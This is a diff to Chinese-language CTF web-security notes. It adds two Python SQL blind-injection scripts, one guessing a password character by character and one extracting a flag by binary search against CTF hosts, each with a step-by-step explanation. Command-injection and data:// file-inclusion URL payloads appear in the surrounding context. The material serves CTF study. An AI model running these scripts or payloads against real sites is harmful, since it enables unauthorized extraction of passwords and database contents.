@@ -411,6 +411,12 @@ SELECT * FROM users WHERE username='vampire     ';
 
 #### SQL 盲注示例代码
 
+- 可以使用示例代码的 SQL 注入语句来测试
+
+##### 猜密码
+
+该方法用于猜密码，需要系统能提示密码正确还是错误。
+
 ```python
 import requests
 
@@ -445,7 +451,84 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 '''
 ```
 
+这段Python代码是一个使用“盲注”技术的SQL注入攻击脚本。SQL注入是一种常见的网络攻击方法，攻击者通过输入恶意的SQL查询语句，试图从数据库中获取或修改数据。
 
+这段代码的主要目标是尝试猜测一个17位的密码。这个密码保存在一个远程服务器的数据库中，服务器的URL是 `'http://3d4bda8e-7eef-4853-9a8d-e0057f666d26.challenge.ctf.show/admin/checklogin.php'`。
+
+这个脚本使用一个字符集 `s`，包含所有的数字和小写字母。然后，它逐个尝试这些字符，从密码的第一位开始，直到第17位。
+
+每次尝试都通过向服务器发送一个POST请求来完成。这个请求中包含一个特殊构造的数据字典 `data`，其中的 `"u"` 键对应的值是一个SQL查询语句的一部分。这个查询语句的意思是：如果密码的第 `i` 位的字符小于当前尝试的字符 `j`，则返回真（即，允许登录）。
+
+然后，这个脚本检查服务器的响应。如果响应是 "密码错误"，那么脚本就知道它找到了密码的第 `i` 位的正确字符。这个字符就是当前尝试的字符 `j` 的前一个字符。然后，脚本将这个字符添加到 `password` 字符串的末尾，并开始寻找下一位字符。
+
+这个过程一直持续到找到完整的17位密码为止。最后，脚本打印出找到的密码。
+
+这是一个非常基本的SQL注入攻击脚本，它使用了一种被称为“盲注”的技术。在“盲注”中，攻击者通过观察应用程序的行为（在这种情况下，是服务器的响应）来推断出数据库中的信息。这种攻击通常比较慢，因为需要逐个字符地猜测信息。
+
+##### 猜 flag
+
+该方案用于已数据库的两个返回内容，如知道 id=1 和 id=2 的返回内容，通过 id 的填充值来注入。
+
+```python
+#buuctf web Hack World
+import requests
+ 
+ 
+url = "http://3bdb8fd8-acb8-4230-96d0-3845226525ba.node4.buuoj.cn:81/index.php"
+flag = ""
+i = 0
+ 
+ 
+while True:
+    i = i + 1
+    letf = 32
+    right = 127
+    while letf < right:
+        mid = (letf+right) // 2
+        # 此处 正确返回1、错误返回2 是依靠的原题目，原题目表单只有输入1和2有返回，只能查询id是1或2的内容。id=1的内容中包含了Hello
+        payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
+        data = {"id":payload} 
+        res = requests.post(url=url, data=data).text
+        if "Hello" in res:
+            letf = mid + 1
+        else:
+            right = mid
+    if letf != 32:
+        flag += chr(letf)
+        print(flag)
+    else:
+        break
+```
+
+这是一段 Python 代码，它使用了二分查找和 SQL 注入的方式来从目标网站的数据库中获取 "flag"。这是一种常见的 CTF（Capture The Flag）比赛中的网页安全挑战。以下是对这段代码的详细解释：
+
+1. `import requests`：导入 Python 的 `requests` 模块，它是一个用于发送 HTTP 请求的库。
+
+2. `url = "http://3bdb8fd8-acb8-4230-96d0-3845226525ba.node4.buuoj.cn:81/index.php"`：这是目标网站的 URL。
+
+3. `flag = ""`：初始化一个空字符串，用于存储查询到的 flag。
+
+4. `i = 0`：初始化一个计数器，用于记录当前正在获取 flag 的哪个字符。
+
+5. `while True:`：开始一个无限循环，直到找到所有的 flag 字符或遇到错误。
+
+6. `letf = 32` 和 `right = 127`：设置 ASCII 值的搜索范围，这个范围涵盖了大部分可打印的字符。
+
+7. `mid = (letf+right) // 2`：计算搜索范围的中点。
+
+8. `payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"`：构造 SQL 注入语句，这个语句会获取 flag 的第 `i` 个字符的 ASCII 值，并检查它是否大于 `mid`。
+
+9. `data = {"id":payload}`：将 SQL 注入语句放入 POST 请求的数据中。
+
+10. `res = requests.post(url=url, data=data).text`：发送 POST 请求并获取响应文本。
+
+11. `if "Hello" in res:`：检查响应文本中是否包含 "Hello"，这可能是根据网站的具体行为来判断 SQL 语句的结果。
+
+12. `letf = mid + 1` 或 `right = mid`：根据响应来调整搜索范围。
+
+13. `if letf != 32:`：如果找到的 ASCII 值不是 32（空格字符），那么将其添加到 flag 中。
+
+这个脚本的基本思想是通过发送特制的 SQL 语句来获取数据库中的数据，这是一种常见的网络攻击技术。在这个脚本中，攻击者使用二分查找的方式来猜测每个字符的 ASCII 值，这种方式比直接猜测每个可能的 ASCII 值要快得多。
 
 ## 代码注入
 
@@ -704,6 +787,8 @@ http://xxx/?c=tac<fla%27%27g.php||
 ```url
 http://xxx/?file=data://text/plain,hello ctf
 ```
+
+注意：上述链接的 `,` 和 `hello` 之间不要有空格
 
 ###### POST 方法注入字符串到文件流
 
